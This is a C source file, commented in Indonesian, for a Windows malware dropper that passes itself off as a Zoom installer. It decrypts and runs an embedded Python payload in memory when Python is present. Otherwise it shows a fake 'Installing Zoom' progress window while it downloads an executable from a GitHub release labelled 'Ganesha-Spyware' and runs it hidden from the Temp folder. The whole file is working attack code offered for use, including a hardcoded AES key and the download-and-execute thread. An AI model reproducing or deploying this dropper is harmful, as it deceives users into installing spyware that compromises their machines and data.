/*
 * loader.c - Multi-Stage Dropper dengan GUI Instalasi Palsu
 * 1. Cek keberadaan Python.
 * 2. Jika ada, jalankan payload dari memori (Stealth Path).
 * 3. Jika tidak ada, tampilkan GUI instalasi palsu sambil mengunduh 
 * dan menjalankan payload stage-2 di background (Compatibility Path).
 *
 * Kompilasi dengan MinGW-w64:
 * gcc loader.c -o ZoomInstaller.exe -lpython310 -mwindows -lcrypt32 -lurlmon -lcomctl32 -I"C:\path\to\Python\include" -L"C:\path\to\Python\libs"
 */

#include <windows.h>
#include <Python.h>
#include <stdio.h>
#include <urlmon.h>      // Diperlukan untuk URLDownloadToFile
#include <commctrl.h>    // Diperlukan untuk Progress Bar

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "comctl32.lib")

// --- Konfigurasi ---
// !!! GANTI DENGAN URL RAW DARI GITHUB RELEASES ANDA !!!
const wchar_t* STAGE2_URL = L"https://github.com/GlgApr/Ganesha-Spyware/releases/download/v1.0-final/agent_standalone.exe";
const wchar_t* STAGE2_FILENAME = L"\\ZoomUpdateService.exe"; // Nama file saat disimpan di folder Temp

// --- Konfigurasi Dekripsi (HARUS SAMA DENGAN packer.py) ---
unsigned char aes_key[] = "my_super_secret_key_1234567890!@";
unsigned char aes_iv[] = "1234567890123456";

// --- Fungsi Dekripsi & Eksekusi dari Memori (Tidak Berubah) ---
BOOL DecryptPayload(BYTE* pData, DWORD* dwDataLen) { /* ... kode sama seperti sebelumnya ... */ HCRYPTPROV hProv = 0; HCRYPTKEY hKey = 0; HCRYPTHASH hHash = 0; BOOL bResult = FALSE; if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return FALSE; if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return FALSE; } if (!CryptHashData(hHash, aes_key, strlen((char*)aes_key), 0)) goto cleanup; if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) goto cleanup; if (!CryptSetKeyParam(hKey, KP_IV, aes_iv, 0)) goto cleanup; if (CryptDecrypt(hKey, 0, TRUE, 0, pData, dwDataLen)) { bResult = TRUE; } cleanup: if(hHash) CryptDestroyHash(hHash); if(hKey) CryptDestroyKey(hKey); if(hProv) CryptReleaseContext(hProv, 0); return bResult; }
void ExecutePythonBytecode(char* bytecode, int size) { Py_Initialize(); PyObject* code_obj = PyMarshal_ReadObjectFromString(bytecode, size); if (code_obj == NULL) { PyErr_Print(); Py_Finalize(); return; } PyObject* main_module = PyImport_AddModule("__main__"); PyObject* main_dict = PyModule_GetDict(main_module); PyObject* result = PyEval_EvalCode(code_obj, main_dict, main_dict); if (result == NULL) { PyErr_Print(); } Py_XDECREF(result); Py_DECREF(code_obj); Py_Finalize(); }
void ExecutePayloadFromMemory() { HRSRC hRes = FindResource(NULL, L"PYPAYLOAD", RT_RCDATA); if (hRes == NULL) return; HGLOBAL hResLoad = LoadResource(NULL, hRes); LPVOID pResLock = LockResource(hResLoad); DWORD dwSize = SizeofResource(NULL, hRes); if (pResLock != NULL && dwSize > 0) { char* payload_buffer = (char*)malloc(dwSize); if (payload_buffer == NULL) return; memcpy(payload_buffer, pResLock, dwSize); DWORD decrypted_len = dwSize; if (DecryptPayload((BYTE*)payload_buffer, &decrypted_len)) { int padding = payload_buffer[decrypted_len - 1]; int final_size = decrypted_len - padding; ExecutePythonBytecode(payload_buffer, final_size); } free(payload_buffer); } }

// --- (BARU) Thread untuk Download & Eksekusi di Background ---
DWORD WINAPI DownloadAndExecuteThread(LPVOID lpParam) {
    wchar_t tempPath[MAX_PATH];
    wchar_t filePath[MAX_PATH];
    
    GetTempPathW(MAX_PATH, tempPath);
    swprintf(filePath, MAX_PATH, L"%s%s", tempPath, STAGE2_FILENAME);

    // Unduh file di background
    HRESULT hr = URLDownloadToFileW(NULL, STAGE2_URL, filePath, 0, NULL);

    if (SUCCEEDED(hr)) {
        // Jika berhasil, jalankan file .exe yang baru secara tersembunyi
        ShellExecuteW(NULL, L"open", filePath, NULL, NULL, SW_HIDE);
    }
    
    // Kirim pesan untuk menutup jendela GUI setelah selesai
    PostMessage((HWND)lpParam, WM_CLOSE, 0, 0);
    return 0;
}

// --- (BARU) Fungsi untuk Membuat GUI Instalasi Palsu ---
void ShowFakeInstaller() {
    // Inisialisasi common controls untuk progress bar
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);

    // Dapatkan handle modul saat ini
    HINSTANCE hInstance = GetModuleHandle(NULL);
    
    // Buat jendela utama
    HWND hWnd = CreateWindowExW(0, L"STATIC", L"Zoom Installer", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
                                CW_USEDEFAULT, CW_USEDEFAULT, 450, 200, NULL, NULL, hInstance, NULL);
    if (hWnd == NULL) return;

    // Tambahkan kontrol ke jendela
    CreateWindowExW(0, L"STATIC", L"Installing Zoom, please wait...", WS_CHILD | WS_VISIBLE,
                    20, 20, 400, 20, hWnd, NULL, hInstance, NULL);
    
    HWND hProgressBar = CreateWindowExW(0, PROGRESS_CLASSW, NULL, WS_CHILD | WS_VISIBLE,
                                        20, 50, 400, 20, hWnd, NULL, hInstance, NULL);
    
    CreateWindowExW(0, L"BUTTON", L"Cancel", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_DISABLED,
                    175, 100, 100, 30, hWnd, NULL, hInstance, NULL);

    // Mulai thread download di background
    CreateThread(NULL, 0, DownloadAndExecuteThread, hWnd, 0, NULL);
    
    // Tampilkan jendela
    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);

    // Animasikan progress bar sementara download berjalan
    SendMessage(hProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
    for (int i = 0; i <= 100; i++) {
        SendMessage(hProgressBar, PBM_SETPOS, i, 0);
        Sleep(100); // Jeda untuk membuat animasi terlihat natural
    }

    // Loop pesan sederhana untuk menjaga GUI tetap responsif
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}


// --- Fungsi Cek Python ---
BOOL IsPythonInstalled() { HKEY hKey; if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Python\\PythonCore", 0, KEY_READ, &hKey) == ERROR_SUCCESS) { RegCloseKey(hKey); return TRUE; } if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Python\\PythonCore", 0, KEY_READ, &hKey) == ERROR_SUCCESS) { RegCloseKey(hKey); return TRUE; } return FALSE; }

// --- Titik Masuk Utama ---
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (IsPythonInstalled()) {
        // Jalur Stealth: Python ada, jalankan dari memori
        ExecutePayloadFromMemory();
    } else {
        // Jalur Kompatibilitas: Python tidak ada, tampilkan GUI dan unduh stage-2
        ShowFakeInstaller();
    }
    return 0;
}
